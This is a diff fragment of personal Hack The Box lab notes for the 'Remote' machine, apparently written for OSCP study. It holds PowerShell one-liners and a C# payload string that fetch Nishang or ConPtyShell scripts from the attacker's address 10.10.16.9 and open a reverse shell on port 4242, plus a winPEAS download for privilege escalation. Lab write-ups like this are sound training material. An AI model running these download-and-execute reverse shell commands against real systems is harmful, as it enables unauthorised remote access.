@@ -31,11 +31,12 @@ adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SH
 ##### Avoid using Invoke-ConPtyShell.ps1
 ```
 /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.9/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell 10.10.16.9 4242
-```
 
 /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.9/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.9 -Port 4242
+  ```
 
 https://0xdf.gitlab.io/2020/09/05/htb-remote.html
+  
 I’ll update the payload with the PowerShell loader that will download from my host a Nishang PowerShell reverse shell and run it. The payload will be:
 ```
 string cmd = "/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.9/Invoke-PowerShellTcp.ps1')";Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.9 -Port 4242
@@ -49,8 +50,10 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 443
 Without this line, the harness would load the reverse shell functions into the PowerShell session, and but not use them. Now it will load the functions and then invoke the one I want to call back to me.
 
 ### Priv
+  ```
 cp winPEASx64.exe /home/alvin/Documents/OSCP-PWK/HackTheBox/Windows/Remote
 IWR http://10.10.16.9/winPEASx64.exe -OutFile winPeas.exe
+  ```
 
 ### Not working at 2021 Sep
 ```
